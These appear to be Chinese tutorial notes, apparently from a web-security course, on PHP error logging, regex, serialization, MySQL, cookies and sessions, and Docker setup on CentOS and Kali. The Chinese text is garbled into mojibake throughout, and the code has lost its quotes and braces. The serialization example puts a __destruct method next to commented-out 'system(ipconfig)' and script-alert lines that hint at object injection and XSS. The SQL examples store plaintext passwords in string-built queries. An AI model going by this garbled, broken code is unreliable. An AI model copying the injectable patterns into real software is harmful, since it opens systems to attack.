è¿™é‡Œæœ‰éœ€è¦ä½¿ç”¨åˆ°php.iniçš„ç›¸å…³é…ç½®é¡¹ã€‚è¿™ä¸¤ä¸ªé…ç½®é¡¹ä¸º è¯´æ˜ï¼š 1.åœ¨è¡¨æ ¼ä¸­çš„log_errorså’Œlog_errors_max_lenéå¸¸å¥½ç†è§£ã€‚ 2.è€Œerror_log æŒ‡å®šå°†é”™è¯¯å­˜åœ¨ä»€ä¹ˆè·¯å¾„ä¸Šã€‚é…ç½®é¡¹ä¸­çš„syslogå¯èƒ½æœ‰ç‚¹ä¸å¤ªå¥½ç†è§£ã€‚syslogæ˜¯æŒ‡ç³»ç»Ÿæ¥è®°å½•ã€‚windowsç³»ç»Ÿåœ¨ç”µè„‘çš„æ—¥å¿—æ”¶é›†å™¨é‡Œé¢ã€‚linuxé»˜è®¤åœ¨ï¼š etcsyslog.conf [æ‰©å±•] äº†è§£çŸ¥è¯†ç‚¹ã€‚è‹¥Linuxç³»ç»Ÿå¯åŠ¨æˆ–ä¿®æ”¹äº†æ—¥å¿—æ”¶é›†ã€‚å¯èƒ½å­˜å‚¨åœ¨ç¬¬ä¸‰æ–¹ä¸“ç”¨çš„æ—¥å¿—æ”¶é›†æœåŠ¡å™¨ä¸­ã€‚ æ­¤å¤–ï¼ŒPHPè¿˜ä¸ºæˆ‘ä»¬ä¸“é—¨å‡†å¤‡äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„é”™è¯¯æ—¥å¿—å‡½æ•°ï¼š bool error_log ( string $ é”™è¯¯æ¶ˆæ¯ [, int $é”™è¯¯æ¶ˆæ¯ç±»å‹ 0 [, string $å­˜å‚¨ç›®æ ‡]] ) è¿™ä¸ªå‡½æ•°å¯ä»¥æŠŠé”™è¯¯ä¿¡æ¯å‘é€åˆ°webæœåŠ¡å™¨çš„é”™è¯¯æ—¥å¿—ï¼Œæˆ–è€…åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œã€‚ å¸¸ç”¨çš„é”™è¯¯æ¶ˆæ¯ç±»å‹ï¼š ç¤ºä¾‹ï¼š ?php //æ— æ³•è¿æ¥åˆ°æ•°æ®åº“æœåŠ¡å™¨ï¼Œç›´æ¥è®°å½•åˆ°php.ini ä¸­çš„error_logæŒ‡å®šä½ç½® error_log(æ— æ³•è¿æ¥åˆ°æ•°æ®åº“æœåŠ¡å™¨æœåŠ¡å™¨); //å¯ä»¥å‘é€é‚®ä»¶ï¼Œä½†æ˜¯php.iniå¿…é¡»é…ç½®è¿‡é‚®ä»¶ç³»ç»Ÿ error_log(å¯ä»¥ç”¨é‚®ä»¶æŠ¥å‘Šé”™è¯¯ï¼Œè®©è¿ç»´äººå‘˜åŠå¤œèµ·åºŠå¹²æ´»,1 ,pig@php.cn); //è®°å½•åœ¨æŒ‡å®šçš„ä½ç½® error_log(æˆ‘æ˜¯ä¸€ä¸ªé”™è¯¯å“Ÿ, 3, d:/test/my-errors.log);? webæœåŠ¡åº”ç”¨ç¨‹åºéƒ½æœ‰è‡ªå·±çš„æ—¥å¿—æ–‡ä»¶ï¼Œæ¯”å¦‚apacheçš„ï¼Œåœ¨phpstudyçš„å®‰è£…è·¯å¾„ä¸­å¯ä»¥çœ‹åˆ°ã€‚ ä¸€èˆ¬æˆ‘ä»¬æ‰‹åŠ¨æ­å»ºçš„apacheçš„é»˜è®¤æ—¥å¿—è·¯å¾„æ˜¯åœ¨ï¼Œé‡ç‚¹æ˜‚ linux: /etc/httpd/logs/access_logwindows: /Apache/logs/access_log 18ï¼ŒPHPæ­£åˆ™è¡¨è¾¾å¼preg_match ( string $ æ­£åˆ™ , string $å­—ç¬¦ä¸² [, array $ç»“æœ] ) åŠŸèƒ½ï¼šæ ¹æ®å®šç•Œç¬¦ï¼Œæ¯”å¦‚$ æ­£åˆ™å˜é‡ï¼ŒåŒ¹é… $å­—ç¬¦ä¸²å˜é‡ã€‚å¦‚æœå­˜åœ¨åˆ™è¿”å›åŒ¹é…çš„ä¸ªæ•°ï¼ŒæŠŠåŒ¹é…åˆ°çš„ç»“æœæ”¾åˆ°$ç»“æœå˜é‡é‡Œã€‚å¦‚æœæ²¡æœ‰åŒ¹é…åˆ°ç»“æœè¿”å›0ã€‚ ?php $zz = /wq/; $string = ssssswqaaawqaaa; if(preg_match($zz, $string, $matches)) echo åŒ¹é…åˆ°äº†ï¼Œç»“æœä¸ºï¼š; var_dump($matches); else echo æ²¡æœ‰åŒ¹é…åˆ°; ? æˆ‘ä»¬å¸¸ç”¨çš„æ­£åˆ™å‡½æ•°æœ‰ 19ï¼Œååºåˆ—åŒ–å‡½æ•°19-1 é¢å‘å¯¹è±¡?phpheader(Content-Type: text/html; charset=utf-8); // åœ¨å“åº”å¤´ä¸­æ·»åŠ äº†content-type: #3 utf-8ï¼Œheader()æ˜¯phpæä¾›çš„åŠ å·¥å“åº”å¤´é”®å€¼å¯¹çš„ class Fruit var $name1 = apple; // å®šä¹‰ å±æ€§ var $name2 = orange; function chi() //å®šä¹‰ æ–¹æ³• echo åƒæ°´æœ.br; echo $this-name1.br; //... function bo() echo å‰¥çš®.br; // ç‰¹æ®Šæ–¹æ³•ï¼Œé­”æ³•\\é­”æœ¯æ–¹æ³•, å½“æŸä¸ªæ—¶æœºåˆ°æ¥æ—¶ï¼Œè‡ªåŠ¨æ‰§è¡Œ function __destruct() //å¯¹è±¡é”€æ¯æ—¶è‡ªåŠ¨æ‰§è¡Œçš„æ–¹æ³•ï¼Œ __construct å¯¹è±¡åˆ›å»ºæ—¶è‡ªåŠ¨è§¦å‘ echo å¯¹è±¡è¢«é”€æ¯äº†.br; $f = new Fruit(); //echo $f-name1.br; // apple $f-chi(); echo å“ˆå“ˆ.br;/* function add() $f = new Fruit(); $f-chi();add();*/? 19-2 åºåˆ—åŒ–å’Œååºåˆ—åŒ–//åºåˆ—åŒ–,å°†å…¶ä»–çš„æ•°æ®è½¬æ¢æˆå­—ç¬¦ä¸²$a = array(one, 33, two);var_dump($a); // array(3) [0]= string(3) one [1]= int(33) [2]= string(3) two echo br; $b = serialize($a);var_dump($b); // string(43) a:3:i:0;s:3:one;i:1;i:33;i:2;s:3:two;//ååºåˆ—åŒ– å°†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸæˆåŸæ¥çš„æ•°æ®ç±»å‹$c=unserialize($b);var_dump($c);//ç±»çš„åºåˆ—åŒ–class S var $name = jaden; function __destruct() echo $this-name; //system(ipconfig); //echo scriptalert(123);/script; function chi() echo xxxxx; $a = new S();echo $a-name.aaaabr;echo $a-chi().br;$b = serialize($a); // O:1:S:1:s:4:name;s:5:jaden;$c = unserialize($b); 20 PHPæ“ä½œMySQL20-1 åˆ›å»ºè¡¨# phpstudyçš„mysqlåœ¨ï¼šC:\\phpStudy\\PHPTutorial\\MySQL\\bin# æ³¨æ„ä¸‹é¢æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä¸è¦æ’å…¥ä¸­æ–‡æ•°æ®ï¼ï¼ï¼ï¼Œå› ä¸ºphpè¿æ¥mysqlçš„ç¼–ç æ²¡æœ‰è®¾ç½®ï¼Œå®¹æ˜“ä¹±ç ã€‚create database jaden charset utf8mb4; create table user(id int NOT NULL AUTO_INCREMENT,username char(20),passwordchar(32),reg_time char(36),PRIMARY KEY (`ID`));insert user(username,password,reg_time)values(admin,123456,CURRENT_TIMESTAMP());insert user(username,password,reg_time)values(wulaoban,123456,CURRENT_TIMESTAMP()); 20-2 æŸ¥è¯¢//è¿æ¥æ•°æ®åº“$db=mysqli_connect(localhost,root,root,jaden, 3306); # é»˜è®¤ç«¯å£å¦‚æœå°±æ˜¯3306ï¼Œé‚£ä¹ˆå…¶å®ä¸ç”¨å†™3306$sql=select * from user where username=wulaoban;//$u = wulaoban;//$sql=select * from user where username=$u;//æ‰§è¡Œsqlè¯­å¥$a=mysqli_query($db,$sql); //éå†æ•°æ®åº“çš„æŸ¥è¯¢ç»“æœï¼Œwhile ($row = mysqli_fetch_assoc($a)) //var_dump($row); echo ç”¨æˆ·å:.$row[username].,å¯†ç :.$row[password]; echo br;mysqli_close($db); å…¶å®phpè¿æ¥mysqlæœ‰ä¸‰ç§æ–¹å¼ï¼Œphpstudyå¸®æˆ‘ä»¬éƒ½å†…ç½®äº†ï¼šmysqlã€mysqliã€pdoï¼Œå…¶ä¸­mysqlæ·˜æ±°äº†ï¼Œä¸å®‰å…¨ã€‚ 20-3 æ’å…¥æ•°æ®$db=mysqli_connect(localhost,root,root,jaden);$sql=insert user(username,password) values(laowang2,111111);$a=mysqli_query($db,$sql);//echo $a.br;if (!$a) echo sqlè¯­å¥è¯­æ³•é—®é¢˜;else echo sqlè¯­å¥æ‰§è¡ŒæˆåŠŸ!;mysqli_close($db); åˆ é™¤æ•°æ®ï¼Œæ›´æ–°æ•°æ®å’Œæ’å…¥æ•°æ®æ­¥éª¤ç±»ä¼¼ 21 Cookieå’ŒSessionç™»å½•è®¤è¯ã€‚ åªä½¿ç”¨cookie location.href=login.php;#è®¾ç½®cookiesetcookie(user,admin);#è¯»å–cookie$_COOKIE[user]; ç«ç‹æµè§ˆå™¨æœ‰ä¸ªCookie-Editoræ’ä»¶ã€‚ cookieç»“åˆsession ## éªŒè¯çš„åœ°æ–¹ï¼š session_start(); isset($_SESSION[user]) ## ç™»å½•æˆåŠŸè®¾ç½®ï¼š session_start(); $_SESSION[user]=$u; $_SESSION[login_time]=time(); $_SESSION[d]=123; $_SESSION[login_status]=1; // sessionå­˜æ”¾ä½ç½®ï¼šåœ¨php.inié…ç½®æ–‡ä»¶ä¸­å¯ä»¥æ‰¾åˆ°ï¼Œsession.save_path å…­ï¼Œdocker6-1 dockerå®‰è£…6-1-1 centos å®‰è£…docker# centos7ä¸Šé¢ç”¨yumå®‰è£…yum install docker -y#å¯åŠ¨dockersystemctl start docker#è®¾ç½®å¼€æœºè‡ªå¯systemctl enable docker#ä½“éªŒdockerç‰ˆnginxæœ€æ–°ç‰ˆdocker run -d -p 80:80 nginx#ä½“éªŒdockerç‰ˆnginx 1.16docker run -d -p 81:80 nginx:1.16#ä½“éªŒwordpressdocker run --name mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7docker run -d --link mysql:mysql -p 86:80 wordpress:5.6 6-1-2 kaili å®‰è£…docker#æ·»åŠ dockerçš„gpgå¯†é’¥ï¼Œç­¾åç”¨çš„curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -#æ·»åŠ dockerçš„aptæºecho deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable | sudo tee /etc/apt/sources.list.d/docker.list#æ›´æ–°aptç¼“å­˜apt update#å®‰è£…dockersudo apt-get install docker docker-compose -yæˆ–sudo apt-get install docker.io#å®‰è£…å®Œæˆä¹‹åï¼Œdockerå°±è‡ªåŠ¨å¯åŠ¨äº†systemctl status docker #æŸ¥çœ‹dockerç‰ˆæœ¬docker -v centosç”¨yumå®‰è£…ï¼Œkaliä¸Šé¢ç”¨aptå®‰è£…ï¼Œkaliå±äºdebianç³»åˆ—çš„æ“ä½œç³»ç»Ÿã€‚ å®‰è£…å¥½dockerä¹‹åï¼Œåé¢ä¸ç®¡æ˜¯centosè¿˜æ˜¯kaliï¼Œåç»­dockerçš„æ“ä½œæŒ‡ä»¤éƒ½æ˜¯ä¸€æ ·çš„ã€‚ 6-1-3 ä½“éªŒä¸€ä¸‹dockerä¸‹è½½å®‰è£…è¿è¡Œnginxé•œåƒ#ä½“éªŒdockerç‰ˆnginxæœ€æ–°ç‰ˆï¼Œæœ¬åœ°æ²¡æœ‰nginxé•œåƒçš„è¯ï¼Œä¼šè‡ªåŠ¨å»ä»“åº“ä¸­æ‹‰å»é•œåƒå¹¶è¿è¡Œdocker run -d -p 80:80 nginx#ä½“éªŒdockerç‰ˆçš„ç‰¹å®šç‰ˆæœ¬çš„nginx 1.16docker run -d -p 81:80 nginx:1.16docker run -d -p 82:80 nginx:1.18#ç›´æ¥æµè§ˆå™¨è®¿é—®ï¼šhttp://192.168.2.121/ å°±èƒ½çœ‹åˆ°nginxé¦–é¡µäº†ã€‚åœ¨å“åº”æ•°æ®ä¸­å°±èƒ½çœ‹åˆ°nginxçš„ç‰ˆæœ¬#æ˜¯ä¸æ˜¯æ„Ÿå—åˆ°äº†å®‰è£…ä¸åŒç‰ˆæœ¬nginxçš„ä¾¿åˆ©ä¹‹å¤„äº†ï¼Œå¦‚æœä¸æ˜¯ç”¨dockerï¼Œä½ æƒ³å»å®‰è£…ä¸€äº›ç‰¹å®šçš„è€ç‰ˆæœ¬è¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ï¼Œå¥½å¤šæ—¶å€™åªèƒ½ç¼–è¯‘å®‰è£…#ä½“éªŒwordpressï¼Œéœ€è¦å¯åŠ¨ä¸¤ä¸ªdockeré•œåƒï¼Œä¸€ä¸ªæ•°æ®åº“çš„ï¼Œä¸€ä¸ªä»£ç ç¨‹åºï¼Œè¿™ä¸ªæ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥é€Ÿåº¦å¯èƒ½ä¼šæ…¢ä¸€äº›docker run --name mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 # 5.7ç‰ˆæœ¬çš„ MySQLï¼Œé•œåƒåç§°æ˜¯mysqldocker run -d --link mysql:mysql -p 86:80 wordpress:5.6 # 5.6ç‰ˆæœ¬çš„wordpressï¼Œæœ€æ–°ç‰ˆæœ¬åº”è¯¥å·²ç»åˆ°äº†6.xäº†ï¼Œä½†æ˜¯å€¼å¾—è¯´æ˜çš„ä¸€ç‚¹å°±æ˜¯å°è£…wordpressçš„äººä¸ºäº†å°†é•œåƒåšçš„æ¯”è¾ƒå°ï¼Œæ²¡æœ‰å®‰è£…ä¸­æ–‡åŒ…ï¼Œæ‰€ä»¥åªèƒ½æ˜¯çœ‹è‹±æ–‡çš„äº†ï¼Œä»–ä¼šè‡ªåŠ¨è¿æ¥æ•°æ®åº“ã€‚å¦‚æœä½ å‘ç°ä½ å®‰è£…çš„é•œåƒä¸æ˜¯ä½ è¦çš„ç‰ˆæœ¬ï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯ç‰ˆæœ¬æŒ‡å®šé”™è¯¯äº†ï¼Œæˆ–è€…æ˜¯å®˜æ–¹é•œåƒä»“åº“ä¸­çš„wordpressé•œåƒç‰ˆæœ¬æœ‰ç‚¹é—®é¢˜äº†ã€‚# å¯ä»¥æ›´æ”¹dockeré•œåƒåº“çš„æºcd /etc/docker vim docker.json # æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œå¹¶ä¿å­˜é€€å‡º registry-mirrors: [https://registry.docker-cn.com] # å¯ä»¥é‡å¯dockeræœåŠ¡systemctl restart dockersystemctl start dockersystemctl enable dockersystemctl stop docker#Dockerä¸­å›½åŒºå®˜æ–¹é•œåƒhttps://registry.docker-cn.com#é˜¿é‡Œäº‘å®¹å™¨ï¼Œä¸è¿‡è¿™ä¸ªå¥½åƒä¸æ›´æ–°äº†ï¼Œå¤§å®¶å¯ä»¥å»é˜¿é‡Œå®˜æ–¹å…³æ³¨ä¸€ä¸‹https://cr.console.aliyun.com/ 6-2 dockeré•œåƒå¸¸ç”¨å‘½ä»¤docker search #æœç´¢é•œåƒ(åªæœç´¢å®˜æ–¹ä»“åº“çš„ï¼Œå®˜æ–¹ä»“åº“åœ°å€ï¼šhub.docker.com) # docker search tomcat # docker search apache # æˆ‘ä»¬æ‹‰å–çš„é•œåƒtomcat\\apacheç­‰åå­—å¾ˆçŸ­å¯¹å§ï¼Œè¿™éƒ½æ˜¯å®˜æ–¹ä»“åº“ä¸­çš„å®˜æ–¹é•œåƒï¼Œå®˜æ–¹ä»“åº“ä¸­æ”¯æŒç”¨æˆ·ä¸Šä¼ è‡ªå·±å°è£…çš„é•œåƒï¼Œç”¨æˆ·é•œåƒå’Œå®˜æ–¹é•œåƒçš„å·®åˆ«åœ¨åå­—ä¸Šé¢ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥å»dockerå®˜æ–¹å»æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç”¨æˆ·è‡ªå·±çš„é•œåƒå‰é¢éƒ½ä¼šæœ‰ä½œè€…çš„ç”¨æˆ·åæˆ–è€…ç”¨æˆ·æ‰€åœ¨ç»„ç»‡çš„åå­—ï¼Œæ¯”å¦‚jaden/nginxã€jaden/tomcatç­‰ã€‚ docker images #æŸ¥çœ‹æœ¬åœ°é•œåƒåˆ—è¡¨ï¼Œimageå°±æ˜¯å›¾åƒã€é•œåƒçš„æ„æ€ # æœ¬åœ°æœ‰çš„é•œåƒï¼Œå°±ä¸è¦å†å»ä¸‹è½½äº†ï¼Œè€Œä¸”å¯ä»¥å°†æœ¬åœ°é•œåƒå¯¼å‡ºæ¥åˆ†äº«ç»™åˆ«äºº docker pull #ä¸‹è½½é•œåƒï¼Œæ‹‰å–é•œåƒ # docker pull tomcat:latest # docker images docker push #ä¸Šä¼ é•œåƒï¼Œæ¨é€é•œåƒï¼Œæ¨åˆ°å®˜æ–¹ä»“åº“ï¼Œæ¨é€ä¸æ˜¯é‚£ä¹ˆç®€å•çš„ï¼Œä¸ç„¶æ—©å°±æ»¡äº†ï¼Œéœ€è¦åœ¨æœ¬åœ°ç™»å½•ä¸€ä¸‹å®˜æ–¹è´¦å·æ‰èƒ½æ¨ï¼Œåé¢å†æ¼”ç¤º docker rmi #åˆ é™¤é•œåƒï¼Œrm imageçš„æ„æ€ï¼Œç›´æ¥rmä¸åŠ iè¡¨ç¤ºè¦åˆ é™¤å®¹å™¨ï¼Œå¯ä»¥é€šè¿‡åç§°åŠ ç‰ˆæœ¬æ¥åˆ é™¤ï¼Œæˆ–è€…ç›´æ¥é€šè¿‡é•œåƒidå€¼æ¥åˆ é™¤ #docker rmi tomcat:latest æˆ–è€… docker rmi imageidå€¼ #å¯ä»¥åŒæ—¶åˆ é™¤å¤šä¸ªé•œåƒï¼šdocker rmi tomcat:latest tomcat:jre17-temurin-jammy #å¦‚æœè¿™ä¸ªé•œåƒå¤„äºè¿è¡ŒçŠ¶æ€çš„æ˜¯åˆ é™¤ä¸äº†çš„ï¼Œæ¯”å¦‚æœ‰å®¹å™¨åœ¨ä½¿ç”¨è¿™ä¸ªé•œåƒï¼Œå°±ä¸èƒ½åˆ é™¤é•œåƒï¼Œæ¯”å¦‚docker rmi nginx:1.16ä¼šæŠ¥é”™ #æŸ¥çœ‹é•œåƒçš„è¿è¡ŒçŠ¶æ€ docker container lsï¼Œ## å…¶å®è¿™æ˜¯æŸ¥çœ‹å®¹å™¨çš„çŠ¶æ€ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°å“ªäº›é•œåƒè¢«ä½¿ç”¨äº† docker save #å¯¼å‡ºé•œåƒ(å‹ç¼©åŒ…) docker save é•œåƒåç§°:ç‰ˆæœ¬ -o docker_nginx1.20.tar.gz docker save nginx:1.16 -o docker.nginx1.16.tar.gz#ls å°±çœ‹åˆ°äº† docker.nginx1.16.tar.gz docker load #å¯¼å…¥é•œåƒ docker load -i docker_nginx1.20.tar.gzï¼Œä¼šè‡ªåŠ¨è§£å‹å¹¶å¯¼å…¥åˆ°dockeræœåŠ¡ä¸­ 6-3 dockerå®¹å™¨çš„å¸¸ç”¨æŒ‡ä»¤#docker å¸¸è§å‘½ä»¤docker run è¿è¡Œä¸€ä¸ªæ–°å®¹å™¨docker ps === docker container ls #å‚æ•°: é»˜è®¤ä¹‹æ˜¾ç¤ºupçŠ¶æ€çš„å®¹å™¨ï¼Œ-aæŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼Œæˆ–è€…--alldocker stop åœæ­¢å®¹å™¨ #ä¾‹å­ docker stop å®¹å™¨idæˆ–è€…å®¹å™¨åå­—docker kill æ€æ‰å®¹å™¨ #å¼ºåˆ¶å…³é—­å®¹å™¨ï¼Œå°½é‡ä¸è¦ç”¨ï¼Œå¾ˆå®¹æ˜“å°±å¯åŠ¨ä¸äº†äº†docker start å¯åŠ¨å®¹å™¨ #ä¾‹å­ docker start å®¹å™¨idæˆ–è€…å®¹å™¨åå­—docker restart é‡å¯é‡å¯ #ä¾‹å­ docker restart å®¹å™¨idæˆ–è€…å®¹å™¨åå­—docker rm åˆ é™¤å®¹å™¨ #ä¾‹å­ docker rm å®¹å™¨idæˆ–è€…å®¹å™¨åå­—ï¼ŒåŒæ—¶åˆ é™¤å¤šä¸ªï¼Œå°±ç©ºæ ¼éš”å¼€ï¼Œå¤„äºupçŠ¶æ€æ˜¯ä¸èƒ½ç›´æ¥åˆ é™¤çš„ï¼Œå¼ºåˆ¶åˆ é™¤æ˜¯å¯ä»¥åˆ é™¤upçŠ¶æ€çš„å®¹å™¨çš„ï¼Œdocker rm -f å®¹å™¨åç§°æˆ–è€…iddocker rm -f `docker ps -a -q` #åˆ é™¤æ‰€æœ‰å®¹å™¨ï¼Œ-qæ˜¯åªæ˜¾ç¤ºå®¹å™¨idï¼Œåå¼•å·ä¸­çš„æŒ‡ä»¤ä¼˜å…ˆæ‰§è¡Œdocker top æŸ¥çœ‹å®¹å™¨å†…çš„è¿›ç¨‹ #ä¾‹å­docker top å®¹å™¨idæˆ–è€…å®¹å™¨åå­—docker stats æŸ¥çœ‹å®¹å™¨çš„èµ„æºå ç”¨æƒ…å†µdocker exec è¿›å…¥å®¹å™¨ #ä¾‹å­ï¼š docker exec -it å®¹å™¨idæˆ–è€…å®¹å™¨åå­— # ç›´æ¥äº¤äº’æŒ‡ä»¤ï¼šdocker exec -it 76738703b7b2 ls # æ‰§è¡ŒlsæŒ‡ä»¤ # è¿›å…¥ç»ˆç«¯ï¼šdocker exec -it 76738703b7b2 /bin/bashæˆ–è€…/bin/sh #/bin/bashæ‰“å¼€ä¸€ä¸ªç»ˆç«¯çª—å£ï¼ŒexitæŒ‡ä»¤é€€å‡ºç»ˆç«¯ï¼Œä½†æ˜¯dockerå®¹å™¨å†…å®¹ä¸€èˆ¬ä¸ä¼šå®‰è£…é¢å¤–çš„è½¯ä»¶ï¼Œæ‰€ä»¥å¯¼è‡´å¤§é‡çš„æŒ‡ä»¤æ˜¯ç”¨ä¸äº†çš„ï¼Œæ¯”å¦‚ifconfigã€psã€ip addrç­‰ docker inspect -f .Name = .NetworkSettings.IPAddress $(docker ps -aq) #å¯ä»¥æŸ¥çœ‹æ‰€æœ‰å®¹å™¨çš„ipåœ°å€çš„ï¼Œå®¹å™¨çš„ipåœ°å€æ˜¯ä»`172.17.0.1`å¼€å§‹åˆ†çš„ã€‚dockerå®¹å™¨ç±»ä¼¼äºä¸€ä¸ªå¾®å‹çš„è™šæ‹Ÿæœºï¼Œå®ƒå ç”¨çš„éƒ½æ˜¯å®¿ä¸»æœº(ç‰©ç†æœº)çš„èµ„æºã€‚åœ¨ç‰©ç†æœºä¸Šæ˜¯å¯ä»¥çœ‹åˆ°å®¹å™¨æ‰€è¿è¡Œçš„ç¨‹åºçš„ã€‚æ¯ä¸ªå®¹å™¨éƒ½æœ‰è‡ªå·±çš„ipåœ°å€ã€‚docker inspect --format=.Name - range .NetworkSettings.Networks.IPAddressend $(docker ps -aq) | grep å®¹å™¨åç§°æˆ–è€…id# curl -I åŠ ç½‘å€ï¼Œå¯ä»¥çœ‹åˆ°httpå“åº”æ•°æ®â”Œâ”€â”€(rootã‰¿jadenkali)-[/home/jaden]â””â”€# curl -I http://172.17.0.4HTTP/1.1 200 OKServer: nginx/1.23.4# netstat -lntupå¯ä»¥çœ‹åˆ°ç»™dockerçš„ç«¯å£æ˜ å°„# docker run -d -p 80:80 nginx #-p 80:80ï¼Œç«¯å£æ˜ å°„ï¼Œè¡¨ç¤ºå®¿ä¸»æœºçš„80ç«¯å£æ˜ å°„åˆ°äº†nginxå®¹å™¨çš„80ç«¯å£ã€‚ ç½‘ç»œç»“æ„ï¼š docker runå‚æ•°ï¼Œæœ‰å¾ˆå¤šå‚æ•°ï¼Œæœ€åä¸€ä¸ªè‚¯å®šæ˜¯é•œåƒ -d #æ”¾åå°è¿è¡Œ-p ç«¯å£æ˜ å°„ #ä¾‹å­ï¼š -p å®¿ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£--name æŒ‡å®šå®¹å™¨çš„åå­— # docker run -it --name jaden é•œåƒidæˆ–è€…åç§°--link å…³è”å¦ä¸€ä¸ªå®¹å™¨ # äº†è§£å³å¯-e MYSQL_ROOT_PASSWORD #è®¾ç½®å®¹å™¨çš„ä¸€äº›å±æ€§ï¼Œäº†è§£ä¸€ä¸‹å³å¯-it #æ˜¯ç»™è¿è¡Œèµ·æ¥çš„è¿™ä¸ªå®¹å™¨åˆ†é…ä¸€ä¸ªç»ˆç«¯ï¼Œå°±å¯ä»¥è¿›å…¥åˆ°å®¹å™¨å†…éƒ¨æ“ä½œäº†# åé¢æƒ³éƒ¨ç½²ä»€ä¹ˆï¼Œç›´æ¥ç½‘ä¸Šæœç´¢å³å¯ã€‚ 6-4 åˆ¶ä½œdockeré•œåƒï¼Œå¹¶ä¸Šä¼ docker pull debian:latestdocker run -it --name jaden_nginx -p 90:80 debian:latest# è¿›å…¥å®¹å™¨docker exec -it jaden_debian /bin/bash# å®‰è£…nginxapt update # æ›´æ–°aptç¼“å­˜apt install nginx -y # å®‰è£…nginxnginx -v # æŸ¥çœ‹nginxç‰ˆæœ¬ï¼Œå®‰è£…å¥½äº† # ip addr# apt install procps # å®‰è£…psæŒ‡ä»¤# ps -efnginx #å¯åŠ¨nginxï¼Œsystemctlæ˜¯æ²¡æœ‰çš„ï¼Œæ²¡æœ‰å®‰è£…è¿™ä¸ªæŒ‡ä»¤exit# æ‰“åŒ…ä¹‹å‰åšå¥½å…ˆåœæ­¢å®¹å™¨docker stop jaden_debiandocker commit jaden_nginx syrjaden/debian_nginx:v1 # æ ¹æ®åå­—æˆ–è€…idéƒ½å¯ä»¥æäº¤ï¼Œåé¢åŠ ä¸ªé•œåƒåç§°å’Œç‰ˆæœ¬,syrjadenæ˜¯dockerä»“åº“ç”¨æˆ·å#ä¸Šä¼ åˆ°å®˜æ–¹ä»“åº“docker login #ç™»å½•å®˜æ–¹ä»“åº“#docker tag debian_nginx:v2 syrjaden/debian_nginx:v2 # è¿™æ˜¯æ”¹åå­—ï¼Œå¦‚æœåç§°ä¸å†²çªå°±ä¸ç”¨æ”¹åå­—docker push syrjaden/debian_nginx:v2 # ç›´æ¥pushå³å¯ 6-5 docker-composedocker-composeæ˜¯æ‰¹é‡ç®¡ç†dockerå®¹å™¨çš„å·¥å…· # æ¯”å¦‚å‰é¢æˆ‘ä»¬å¯åŠ¨çš„wordpressé¡¹ç›®ï¼Œéœ€è¦å¯åŠ¨ä¸¤ä¸ªå®¹å™¨æ‰è¡Œï¼Œæœ‰æ—¶å€™å°±æ˜¯è¿™æ ·ï¼Œéœ€è¦åŒæ—¶å¯åŠ¨å¤šä¸ªå®¹å™¨æ¥å®Œæˆä½ æƒ³è¦åšçš„äº‹æƒ…ï¼Œä½†æ˜¯åˆ°åº•å¯åŠ¨å¤šå°‘ä¸ªå®¹å™¨å‘¢ï¼Ÿæ¯”å¦‚wordpressé‚£ä¸ªï¼Œæˆ‘ä»¬è®°ä¸ä½ï¼Œæ¢ä¸€ä¸ªæœºå™¨ä¸çœ‹ç¬”è®°å¾ˆéš¾èµ·æ¥ï¼Œæœ‰äº†docker-composeå°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜äº†ã€‚#centos7å®‰è£…docker-composeï¼Œæˆ‘ä»¬å‰é¢å·²ç»å®‰è£…äº†ï¼Œä¸éœ€è¦å†æ¬¡å®‰è£…äº†yum install epel-release.noarch -yyum install docker-compose -y#kaliå®‰è£…docker-composeapt install docker-compose -y# æŸ¥çœ‹ç‰ˆæœ¬docker-compose -v è¿™é‡Œç»™å¤§å®¶è¡¥å……ä¸ªç‚¹ systemctl restart docker é‡å¯dockeræœåŠ¡ä¼šè‡ªåŠ¨å…³é—­æ‰€æœ‰çš„å®¹å™¨ã€‚ #å¯åŠ¨å®¹å™¨çš„æ—¶å€™ï¼Œå¦‚æœåŠ ä¸Šäº†--restart=alwaysï¼Œé‚£ä¹ˆé‡å¯æœåŠ¡ä¹‹åï¼Œè¿™ä¸ªå®¹å™¨ä¼šè‡ªåŠ¨å¯åŠ¨docker run -it -d --restart=always nginx:1.16 # å®ç°äº†å¼€æœºè‡ªå¯åŠ¨çš„æ•ˆæœ é…ç½®æ–‡ä»¶docker-compose.ymlï¼Œæœ‰äº†è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œå°±å¯ä»¥é€šè¿‡docker-composeæ¥æ§åˆ¶å¤šä¸ªå®¹å™¨äº† # ä¸ºäº†é¿å…ç«¯å£å†²çªï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå…³é—­æ‰€æœ‰dockerå®¹å™¨docker stop `docker ps -a -q`# ä¸ºäº†æ¼”ç¤ºæ–¹ä¾¿ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªwordpressæ–‡ä»¶å¤¹ï¼Œè¿›å…¥åˆ°é‡Œé¢åˆ›å»ºä¸€ä¸ªdocker-compose.ymlåå­—çš„æ–‡ä»¶mkdir wordpresscd wordpress/touch docker-compose.ymlvim docker-compose.yml# å°†å¦‚ä¸‹å†…å®¹æ‹·è´åˆ°æ–‡ä»¶ä¸­ä¿å­˜é€€å‡ºï¼Œæ³¨æ„æ‹·è´çš„æ—¶å€™ï¼ŒæŠŠé‡Œé¢æˆ‘æ ‡è®°çš„æ³¨é‡Šå»æ‰ã€‚# 